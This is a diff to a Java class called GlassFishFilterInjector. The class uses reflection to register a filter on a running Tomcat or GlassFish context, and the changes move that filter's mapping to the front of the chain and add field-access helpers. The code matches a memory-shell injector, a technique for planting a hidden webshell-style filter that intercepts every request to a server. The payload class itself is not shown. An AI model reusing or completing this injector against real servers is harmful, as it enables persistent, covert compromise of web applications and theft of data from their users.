@@ -7,7 +7,10 @@ import java.io.PrintStream;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
-import java.util.*;
+import java.util.HashSet;
+import java.util.List;
+import java.util.Map;
+import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 /**
@@ -126,15 +129,18 @@ public class GlassFishFilterInjector {
         }
         Object filterDef;
         Object filterMap;
+        Class<?> filterMapClass;
         ClassLoader contextClassLoader = context.getClass().getClassLoader();
         try {
             // tomcat v8+
             filterDef = contextClassLoader.loadClass("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
-            filterMap = contextClassLoader.loadClass("org.apache.tomcat.util.descriptor.web.FilterMap").newInstance();
+            filterMapClass = contextClassLoader.loadClass("org.apache.tomcat.util.descriptor.web.FilterMap");
+            filterMap = filterMapClass.newInstance();
         } catch (Exception e2) {
             // tomcat v5+
             filterDef = contextClassLoader.loadClass("org.apache.catalina.deploy.FilterDef").newInstance();
-            filterMap = contextClassLoader.loadClass("org.apache.catalina.deploy.FilterMap").newInstance();
+            filterMapClass = contextClassLoader.loadClass("org.apache.catalina.deploy.FilterMap");
+            filterMap = filterMapClass.newInstance();
         }
 
         invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{getClassName()});
@@ -145,19 +151,16 @@ public class GlassFishFilterInjector {
         }
         invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
         invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{getClassName()});
-        Constructor<?>[] constructors;
         try {
             invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
         } catch (Exception e) {
             // tomcat v5
             invokeMethod(filterMap, "setURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
         }
-        try {
-            // v7.0.0 以上
-            invokeMethod(context, "addFilterMapBefore", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
-        } catch (Exception e) {
-            invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
-        }
+
+        // addFilterMapFirst
+        List filterMaps = (List) invokeMethod(context, "findFilterMaps", null, null);
+        filterMaps.add(0, filterMap);
 
         Constructor filterConfigConstructor;
         filterConfigConstructor = contextClassLoader.loadClass("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors()[0];
@@ -228,18 +231,36 @@ public class GlassFishFilterInjector {
     }
 
     @SuppressWarnings("all")
-    public static Object getFieldValue(Object obj, String name) throws Exception {
-        Class<?> clazz = obj.getClass();
-        while (clazz != Object.class) {
+    public static Field getField(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
+        for (Class<?> clazz = obj.getClass();
+             clazz != Object.class;
+             clazz = clazz.getSuperclass()) {
             try {
-                Field field = clazz.getDeclaredField(name);
-                field.setAccessible(true);
-                return field.get(obj);
-            } catch (NoSuchFieldException var5) {
-                clazz = clazz.getSuperclass();
+                return clazz.getDeclaredField(name);
+            } catch (NoSuchFieldException ignored) {
+
             }
         }
         throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
+    }
+
+
+    @SuppressWarnings("all")
+    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
+        try {
+            Field field = getField(obj, name);
+            field.setAccessible(true);
+            return field.get(obj);
+        } catch (NoSuchFieldException ignored) {
+        }
+        return null;
+    }
+
+
+    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
+        Field field = getField(obj, fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
     }
 
 
